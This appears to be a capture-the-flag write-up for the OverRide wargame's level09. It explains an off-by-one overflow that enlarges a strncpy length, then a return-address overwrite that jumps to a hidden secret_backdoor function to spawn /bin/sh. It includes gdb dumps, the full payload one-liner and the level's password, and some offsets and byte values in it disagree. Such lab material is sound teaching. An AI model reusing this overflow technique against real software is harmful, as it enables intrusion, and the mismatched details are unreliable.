Level09

Running this binary gives us a username and message prompts, both using fgets(). After disassembling
we notice a secret_backdoor() function that will run any system command we provide but it is not part of the execution flow.
From this we can assume we will have to overwrite an EIP save and redirect to it.

The strings received by the program for the username and message prompts are handled
 by set_username() and set_msg() functions respectively and are then stored inside the following structure:

typedef struct s_message
{
    char text[140];		// message destination
    char username[40];		// username destination
    int len;			// 140
} t_message;

Both functions use local buffers to store each result of fgets() before copying it into the main structure.
They use two different methods to make this copy:

    set_msg() uses strncpy() and the s_message->len as size parameter.
    set_username() copies the characters one by one from the local buffer to s_message->username using a loop and index.

The copy loop in set_username() is repeated 41 times, this means we have a 1 byte overflow
 that allows us to overwrite the first (biggest) byte of s_message->len, and in turn change
  the size parameter for the strncpy() call in set_msg() to any value from 0 to 256.

If the EIP save is less than 248 bytes after our s_message->text buffer (this binary is 64 bit
 so we need 8 bytes to write the address) we can exploit this 1 byte overflow to take control of the execution flow.


Since the binary has been compiled in 64-bit, we need to find the right offset to overwrite the content
 of the stack pointer RSP (not the EIP/RIP) in order to make handle_msg jump to secret_backdoor instead of returning to main.

To do so, We prepare the following string : 40 characters + the bigger one-byte value (0xff or 255) to overwrite msglen value 
and make strncpy go as far as we can + a newline character to end the first fgets + a string of 256 characters generated via
 this buffer overflow string generator that supports 64-bit registers.

level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"' > /tmp/level09

r < /tmp/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xd ('\r')
RBX: 0x0
RCX: 0x7ffff7b01f90 (<write+16>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd5a90 --> 0x0
RSI: 0x7ffff7ff7000 (">>: >: Msg sent!\n", 'A' <repeats 39 times>"\377, >: Msg @Unix-Dude\n")
RDI: 0xffffffff
RBP: 0x6741356741346741 ('Ag4Ag5Ag')
RSP: 0x7fffffffe5c8 ("6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
RIP: 0x555555554931 (<handle_msg+113>:	ret)
R8 : 0x7ffff7ff7004 (">: Msg sent!\n", 'A' <repeats 39 times>"\377, >: Msg @Unix-Dude\n")
R9 : 0xc ('\x0c')
R10: 0x21 ('!')
R11: 0x246
R12: 0x555555554790 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe6b0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554924 <handle_msg+100>:	lea    rdi,[rip+0x295]        # 0x555555554bc0
   0x55555555492b <handle_msg+107>:	call   0x555555554730 <puts@plt>
   0x555555554930 <handle_msg+112>:	leave
=> 0x555555554931 <handle_msg+113>:	ret
   0x555555554932 <set_msg>:	push   rbp
   0x555555554933 <set_msg+1>:	mov    rbp,rsp
   0x555555554936 <set_msg+4>:	sub    rsp,0x410
   0x55555555493d <set_msg+11>:	mov    QWORD PTR [rbp-0x408],rdi

We provide the RBP address 0x6741356741346741 to our tool, then add 8 to the result to reach the RSP content offset, 200.

Now, we get the secret_backdoor address with gdb. Note that the program must have been started to get the right address after the dynamic relocation.

gdb-peda$ info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

From here we have everything we need to perform the exploit. Let's generate our final string, composed of three parts:

In first, we copy the same string as the previous one we have used to fill the first fgets call and overwrite msglen value,
 but we may change this value to match exactly the needed size, 200 + 8 bytes (for the address itself), so 0xd0 in hexadecimal.
Then, 200 characters to reach the offset, the secret_backdoor address which will overwrite the content of RSP, and a newline 
character to stop the second fgets reading.
Finally, if everything works as expected, we will jump to secret_backdoor which uses a third fgets to get the command 
to send to system, so we just add "/bin/sh". Here we go!




The buffer starts in rbp - 0xc0 (192) and there is a single push rbp (8), this means the
 EIP save is at buffer + (192 + 8).

All that is left is to get the address for secret_backdoor() and write our command:

 Summary:
    - username 'a'*40+0x000004D8[::-1]
    - messege 'a'*200 + 0x000055555555488c[::-1]
    - secret_backdoor /bin/sh



python -c "print 40 * 'a' + '\xd4' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/exampl09
level09@OverRide:~$ cat /tmp/exampl09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE